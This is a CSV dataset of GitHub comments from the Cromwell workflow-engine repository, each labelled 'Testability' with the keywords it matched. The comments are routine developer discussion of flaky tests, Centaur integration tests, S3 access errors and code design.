Testability,"@ktibbett is this still a feature that would help the production pipeline? ; @geoffjentry aside from the risk of duplicate naming for output and logs, are there any other risks involved? What would be the effort?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325671959:145,log,logs,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325671959,1,['log'],['logs']
Testability,@lbergelson -- is this a reproducible issue? Perhaps we can create a simplified test case for our debugging.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-390838429:80,test,test,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-390838429,2,['test'],['test']
Testability,"@lbergelson right, these look like transient failures so I'l give the tests a quick nudge...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5224#issuecomment-542372465:70,test,tests,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5224#issuecomment-542372465,1,['test'],['tests']
Testability,"@ldgauthier and @Leetl1220 do you know how many users use Cromwell with SGE?. As a **SGE user**, I want to **the SGE config to be tested in Centaur**, so that I can **avoid regressions**.; - Effort: **Medium to Large**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324443806:130,test,tested,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324443806,1,['test'],['tested']
Testability,"@likeanowl - Took a look at the PR. Overall, looks good, but had a couple questions. Do the new integration tests you mention cover the points I brought up - i.e. mostly around default credentials use and default region config?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-523568967:108,test,tests,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-523568967,1,['test'],['tests']
Testability,"@likeanowl Yes - you just need to specify it in the centaur [test description](https://github.com/broadinstitute/cromwell/blob/develop/centaur/src/main/resources/standardTestCases/docker_alpine.test#L8), with a pointer to where the option file lives",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5105#issuecomment-519609887:61,test,test,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5105#issuecomment-519609887,2,['test'],['test']
Testability,@likeanowl any update on the test case?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-547451533:29,test,test,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-547451533,1,['test'],['test']
Testability,"@markjschreiber . I tested your theory, and while the job was able to complete successfully the second time around (after changing the job definition), it didn't update the status in the Cromwell database. Do you reckon it should be possible for me to manually change a record in the database in order to get cromwell to continue where it left off, or will I need to resubmit the entire workflow, and hope that CallCaching is working?. In this particular workflow I'm running, I've observed that CallCaching works.... sometimes(?).... but I was surprised by the amount of Cache misses I observed, which I'm not really sure how to troubleshoot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775:20,test,tested,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-729517775,1,['test'],['tested']
Testability,@markjschreiber looks like we found your flakey test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5471#issuecomment-606900517:48,test,test,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5471#issuecomment-606900517,1,['test'],['test']
Testability,"@matthewghgriffiths did it work with `\cromwell_mount` or `\cromwell_root`. I'm getting a very similar error, and I've double checked that I had ""cromwell_root"" as listed [here](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/#custom-ami-with-cromwell-additions). I created my AMI today, and I definitely have read / write access from my EC2 instance. I also can't see any Cromwell-execution folders in the bucket, but I do see the cromwell-workflow-logs on my EC2 instance. I created the AMI with the cromwell type, and I've checked that my IAM profile has access to the execution and storage bucket, and confirmed this in the CLI. . ```; Caused by: java.io.IOException: Could not read from s3://<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt: s3://s3.amazonaws.com/<bucket-name>/cromwell-execution/gatkRecalNormal/df58d76a-c3fe-4fb7-94c6-f4bd9ad1d5de/call-gatkBaseRecalibrator/gatkBaseRecalibrator-rc.txt; 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:146); 	at cromwell.engine.io.nio.NioFlow$$anonfun$withReader$2.applyOrElse(NioFlow.scala:145); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at cromwell.engine.io.nio.NioFlow.withReader(NioFlow.scala:145); 	at cromwell.engine.io.nio.NioFlow.limitFileContent(NioFlow.scala:154); 	at cromwell.engine.io.nio.NioFlow.$anonfun$readAsString$1(NioFlow.scala:98); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:85); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:336); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:357); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:303); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651:475,log,logs,475,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651,1,['log'],['logs']
Testability,"@matthewghgriffiths, for troubleshooting why nothing gets written at any point:. 1. Set the min cpus in your compute environment (the one in use) to at least 1 so that an instance spins up and will stay available for a little bit. This will give you an instance that lives for long enough to test things.; 2. SSH into the instance that spins up (or one already running) in the compute environment.; 3. Try to `aws s3 cp` a file into your cromwell executions bucket. Doing this from the instance simulates the permissions used by the batch job. If you get an error about permissions, then there is likely a policy problem with your instance role.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435024011:292,test,test,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435024011,1,['test'],['test']
Testability,"@mcovarr , @cjllanwarne . ~~Sorry for the errors still. I want to test locally of course, but that does not work for some reason:~~; EDIT: Nevermind. I found the documentation here: https://cromwell.readthedocs.io/en/stable/developers/Centaur/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-482021138:66,test,test,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4815#issuecomment-482021138,1,['test'],['test']
Testability,"@mcovarr ; Is the bucket http://s3.amazonaws.com/cromwell-centaur-execution/ public? Because when I tried to open it, I've got `AccessDenied`. ; As far as I know, centaur do not share credentials with cromwell (at least if credentials were provided in `.conf` file, idk what about default auth mechanism), and therefore this exception may be caused by lack of credentials on centaur side.; Actually, in this PR a support for aws auth was added to centaur, so can you please try to run this test with aws credentials in `centaur/src/main/resources/reference.conf`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-544924499:490,test,test,490,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-544924499,1,['test'],['test']
Testability,"@mcovarr @Horneth I have not been able to make tests work when DataAccess is a singleton. If you can diagnose the failures in branch: ""data_access_singleton"" then let me know, but I don't think I'll do it as part of this ticket.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-142934075:47,test,tests,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-142934075,1,['test'],['tests']
Testability,"@mcovarr @aednichols you both asked the same question from different directions... I'll try to answer both in one go:. * This *does not* alter how the class operates in production because it's a `None foreach { ... }`.; * I override the `None` in the spec so that I can guarantee the events land as a unit and aren't interrupted by the occasional flushing action. FWIW I did try to move *all* of this logic into the test class to avoid cluttering the main, but got tangled up trying to override the FSM actions with a `receive` in the test class and it ended up not working as I'd hoped.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4898#issuecomment-486854451:401,log,logic,401,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4898#issuecomment-486854451,3,"['log', 'test']","['logic', 'test']"
Testability,"@mcovarr @cjllanwarne I made substantial changes to allow for automatic release number calculation and added the few things we talked about (pin centaur branch, add hotfix branch). It still has command injection though...; I tested it on a fork and as far as I can tell everything looked good.; If you don't mind re-giving it a look, otherwise I'll probably merge it as is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-287431325:225,test,tested,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-287431325,1,['test'],['tested']
Testability,"@mcovarr @cjllanwarne This PR is now more-or-less in the state it was this morning, albeit with a lot of stuff changed as per your request. It's a lot different now so worth a re-look (unit tests are still borked, and this time it's sans centaur-ing as well, but eh)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230930417:190,test,tests,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1127#issuecomment-230930417,1,['test'],['tests']
Testability,"@mcovarr @dinvlad - but _is_ this tested anywhere?. This seems reasonable to me, but are we sure this is correct?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5287#issuecomment-555110419:34,test,tested,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5287#issuecomment-555110419,1,['test'],['tested']
Testability,"@mcovarr @geoffjentry . The line was making `object_lookup` and `member_lookup` pass. See the new way of making them pass in commit ""Fixup member_access and object_access centaur tests"". This new way of making the tests work feels much correct-er to me and removes that special case that (a) didn't make sense prima-facie and (b) was causing problems elsewhere.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3181#issuecomment-360556825:179,test,tests,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3181#issuecomment-360556825,2,['test'],['tests']
Testability,"@mcovarr @geoffjentry Like I mentioned at standup I added a second commit after seeing a failure in centaur.; What happened was JES failed the job because it couldn't localize the auth file (not found).; However I didn't see anything in Cromwell suggesting that the upload failed (which we log if it happens). So my guess is JES tried to localize the file when Cromwell was restarting the workflow and hence re-writing the file, which made sense according to the timestamps at least. This commit makes the upload of the auth file fail if the file already exists, unless it's a known restart in which case it ignores the failure and keeps going. I think it makes sense to fail the workflow if there's already an auth file for this workflow and it's the *first* time we run it. It might indicate something is wrong and failing the workflow avoids taking chances with refresh tokens / secrets. If you disagree please voice your concerns :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2490#issuecomment-319093447:290,log,log,290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2490#issuecomment-319093447,1,['log'],['log']
Testability,@mcovarr @kshakir I'm not sure which (if any) of the 'dataAccess.shutdown's should be left in? No tests work if any are left in but I'm fairly sure we want to close the singleton connection eventually...?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/203#issuecomment-143344651:98,test,tests,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/203#issuecomment-143344651,1,['test'],['tests']
Testability,@mcovarr @kshakir a quick second pass would be appreciated :) I followed (one of :p) @cjllanwarne suggestions and added an attribute to EGIN instead of passing a function pointer.; I also fixed the FQNs for CWL EGINs which makes the pre-existing `CwlInputValidationSpec` actually test that this works now.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349403403:280,test,test,280,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349403403,1,['test'],['test']
Testability,@mcovarr Any reason why the build is failing? I ran all the tests locally and it looked like it ran successfully.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/522#issuecomment-193983054:60,test,tests,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/522#issuecomment-193983054,1,['test'],['tests']
Testability,"@mcovarr DoD is to have the conformance test exercising Cromwell in their CI. I know that that requires a command line program in a well known location, but they're not picky about the implementation of that program other than it's transforming that API they provide to the CWL implementation. I'm also not picky, was just throwing out a few other possibilities which might have been overlooked. . If you're afraid of proceeding without some Bird-X, I'd suggest maybe writing up something (or via faces) describing how other systems handle this and seeing if anyone else has strong opinions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2590#issuecomment-328223594:40,test,test,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2590#issuecomment-328223594,1,['test'],['test']
Testability,"@mcovarr Fixes made. Not sure what's up with Travis now. The tests themselves passed, assembly failed for deduplication reasons...?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201451830:61,test,tests,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201451830,1,['test'],['tests']
Testability,"@mcovarr Given that these were JES specific failures, I'm going to run Tyburn over them. Presumably the local tests for these are already there and already working?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/290#issuecomment-156140460:110,test,tests,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/290#issuecomment-156140460,1,['test'],['tests']
Testability,"@mcovarr I agree re testing, however IMO showing that there are outbound messages to start a CallActor at the same time is sufficient to demonstrate exactly what you just stated. At that point you know you have multiple CallActors running independently of each other which represent async computations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103308232:20,test,testing,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103308232,1,['test'],['testing']
Testability,"@mcovarr I believe all issues are addressed. I'll let you cherry-pick / merge / squash or even reject this PR at your will. Pre-tech talk with @geoffjentry (including a TLA extravaganza!):. **TL;DR The database/slick is for CRUD, not for the T in ETL.**. IMHO, the database code started to evolve well beyond CRUD. Very often in slick specific code, one saw multiple lines of code like: ""before inserting rows in slick, quickly (E)xtract some other rows, (T)ransform them into core objects, filter, re-transform them into new core objects, then (L)oad the new objects into slick."" That ETL embedded in slick could never be used DRY-ly, and to me smelled as violating separation of concerns. With the current SoC, the slick code is _mostly_ concerned with marshaling data to and from the database via slick. If I wanted to, I could very trivially create a different layer that marshaled data using hibernate, a thin layer of prepared statements, mocks, etc., _without_ duplicating a lot of the ETL code. Another way of visualizing the issue: Below is the current project dependency diagram. The services need to access data from the database. Currently that's implemented as the services depend on engine that depends on the database. The database used to have a similar same circular dependency. Gun-shy of folks (including myself) re-introducing a similar dependency loop, I've kept core as far away as possible from the database/slick, because the slick specific code _should not_ need core for basic CRUD. As for the rest of the system, I see core as a base of objects for backends and the engine to communicate. ![cromwell project dependency diagram](https://cloud.githubusercontent.com/assets/791985/15779136/92db94a6-2968-11e6-90f8-c0b40d162a56.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/935#issuecomment-223577591:945,mock,mocks,945,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/935#issuecomment-223577591,1,['mock'],['mocks']
Testability,@mcovarr I believe comments are addressed modulo the 1 WONTFIX and my statement that I might add some extra unit testing to the old abort code,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-442213519:113,test,testing,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-442213519,1,['test'],['testing']
Testability,@mcovarr I can't imagine 0.20 being useful to GOTC w/o workflow logs,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/814#issuecomment-224761993:64,log,logs,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/814#issuecomment-224761993,1,['log'],['logs']
Testability,"@mcovarr I remember you mentioned a way to pause & examine the Slick queries in the debugger - what's a good code location to pause at?. The last time I looked at this I just enabled MySQL logging, which was a ton to dig through",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4249#issuecomment-429893248:189,log,logging,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4249#issuecomment-429893248,2,['log'],['logging']
Testability,@mcovarr I tested the commands manually on my Cromwell fork and it worked so merging this,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3423#issuecomment-373821451:11,test,tested,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3423#issuecomment-373821451,1,['test'],['tested']
Testability,@mcovarr I thought we said that the move to unicromwell wouldn't require `cromwell-` in front of jar names? I noticed that this morning in the convo about where the `wdl4s` artifacts went. If this is a program designed to generically test wdl & cwl (which IMO it **is**) it shouldn't have `cromwell-` in front of the name.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2762#issuecomment-337983823:234,test,test,234,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2762#issuecomment-337983823,1,['test'],['test']
Testability,@mcovarr I'd be careful - I don't know about this one in particular but some of those tests aren't 100% ports from tyburn and actually have changed For Reasons,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224284216:86,test,tests,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/955#issuecomment-224284216,1,['test'],['tests']
Testability,"@mcovarr Indeed, these tests were checking that updateBackendExecutionStatus was updating the execution table which is no longer its responsibility. Looking over the tests, this seems to be checked for the setStatus call elsewhere.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/215#issuecomment-145657965:23,test,tests,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/215#issuecomment-145657965,2,['test'],['tests']
Testability,"@mcovarr Just rebased with the latest develop. Tests pass locally, and waiting for the results on Travis :sweat_smile: ; With the time gap b/w us, and given that I'll be a little later here at work tomorrow w.r.t you guys, please feel free to merge this to develop so that the blockers because of this PR can be continued elsewhere (given the tests pass here of course and everything looks good). Else, I can come in and do that if there's any corrections required. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/582#issuecomment-202728024:47,Test,Tests,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/582#issuecomment-202728024,2,"['Test', 'test']","['Tests', 'tests']"
Testability,"@mcovarr Sure. Using the async ref worked for me, such that the tests didn't need to be ignored. FYI, I did run into at least one of our wonderful intermittent timeouts, that disappeared after re-running.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155192304:64,test,tests,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155192304,1,['test'],['tests']
Testability,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:655,test,test-cromwell-genomics-resources,655,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124,2,['test'],['test-cromwell-genomics-resources']
Testability,"@mcovarr When we handle responses from Google they're using numeric codes, and what we did the first time around was parse their documentation and set up constants to match their values. As it turns out (thanks @helgridly) at least for one of the classes of RPC codes we use they have them in a handy enum in the library I'm including so I'm switching to using that. . On the off chance that they change them, we'll pick up on that. That said, since preemption & PAPI edge cases are some of our weaker tested yet most important areas I'm also happy to just continue using our hardcoded values.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2508#issuecomment-319440432:502,test,tested,502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2508#issuecomment-319440432,1,['test'],['tested']
Testability,"@mcovarr Yes. I am trying to add a centaur test case for DRS and I am still working on getting the config right. I thought I corrected it with the last commit, but apparently not...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5039#issuecomment-505092978:43,test,test,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5039#issuecomment-505092978,1,['test'],['test']
Testability,@mcovarr and @kshakir I had to rebase on top of your all's changes so if you could take a closer than usual eye on the abort logic in `CromwellApiService` to make sure I've captured your changes that'd be 💯,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-441837669:125,log,logic,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-441837669,1,['log'],['logic']
Testability,"@mcovarr and thanks for pointing these out, I'll try those tests locally and see if I can suss out any other issues w/ optionals.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3149#issuecomment-358985345:59,test,tests,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3149#issuecomment-358985345,1,['test'],['tests']
Testability,"@mcovarr as first reviewer. Travis already seems configured to ignore integration tests, so no other changes appeared necessary for this temporary fix.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/357#issuecomment-169440511:82,test,tests,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/357#issuecomment-169440511,1,['test'],['tests']
Testability,@mcovarr because sometimes they were getting `attempt-1`s and sometime call cached. I _think_ that the workflows must have been copy/pasted from elsewhere in the test suite and it was a coin toss on which was running first.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5429#issuecomment-590992581:162,test,test,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5429#issuecomment-590992581,1,['test'],['test']
Testability,@mcovarr can you take a run through the non-test stuff in here?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/23#issuecomment-104697557:44,test,test,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/23#issuecomment-104697557,1,['test'],['test']
Testability,@mcovarr could we make a simple centaur test? Or even a PR into CWL’s suite?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374914130:40,test,test,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374914130,2,['test'],['test']
Testability,@mcovarr hmm I guess technically this `NoopServiceActor` is 100% untested...; I'll move it to the test folder or test that it indeed does nothing,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3455#issuecomment-376364550:98,test,test,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3455#issuecomment-376364550,2,['test'],['test']
Testability,"@mcovarr indeed. I think our centaur tests were set up to assume certain limits, and by changing the defaults I've upset the tests. I _think_ I just need to work out where to re-set those centaur defaults but the inheritance hierarchy for those files is kind of opaque to me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5034#issuecomment-507303574:37,test,tests,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5034#issuecomment-507303574,2,['test'],['tests']
Testability,@mcovarr is there a reason why your test WDL is installing `jq` in the command rather than picking a docker image which already has it installed?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-461103349:36,test,test,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4609#issuecomment-461103349,1,['test'],['test']
Testability,@mcovarr it was 💯 green before i pushed the PR so i'm gonna blame our very stable test suite for now,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3989#issuecomment-411623224:82,test,test,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3989#issuecomment-411623224,1,['test'],['test']
Testability,"@mcovarr oh I see thanks. Well I only saw 4 failures IIRC, so it's not that bad. In the meantime we could always keep `/bin/bash` as the default and set it to`/bin/sh` for CWL conf tests which would make 117 pass",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3697#issuecomment-392814191:181,test,tests,181,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3697#issuecomment-392814191,1,['test'],['tests']
Testability,"@mcovarr re concurrency testing I still think that's _way_ too overkill. There should be no forced timings, scraping of logs, etc. We know that Calls are wrapped by independent CallActors. As long as multiple CallActors are informed of their startable status by the same event, that's all we need to demonstrate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103264851:24,test,testing,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103264851,2,"['log', 'test']","['logs', 'testing']"
Testability,@mcovarr re test ;) https://www.manning.com/books/type-driven-development-with-idris,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/444#issuecomment-182685685:12,test,test,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/444#issuecomment-182685685,1,['test'],['test']
Testability,@mcovarr re testing - I would agree that some CallCaching tests would be nice but... I would argue that this DB connection layer wouldn't be an obvious candidate for unit tests. I actually think perhaps enhancing the EJEA tests would be more worthwhile but definitely some centaur tests. I can write up a ticket for those,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1268#issuecomment-238703519:12,test,testing,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1268#issuecomment-238703519,5,['test'],"['testing', 'tests']"
Testability,"@mcovarr regarding test coverage, I'm sure I can add some tests, or at least verify that all paths through that restart code are hit",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/704#issuecomment-210442317:19,test,test,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/704#issuecomment-210442317,2,['test'],"['test', 'tests']"
Testability,@mcovarr see #4848 - it's nontrivial to make a test for this (as in - we'll probably need to add a new mode to Centaur). We decided to punt for now during the hackathon.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4853#issuecomment-485050758:47,test,test,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4853#issuecomment-485050758,1,['test'],['test']
Testability,"@mcovarr see new test. Before this change they fail because they were inserting extra `""`s:; ```; Expected :WdlString(someStr); Actual :WdlString(""someStr""); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2689#issuecomment-335849487:17,test,test,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2689#issuecomment-335849487,1,['test'],['test']
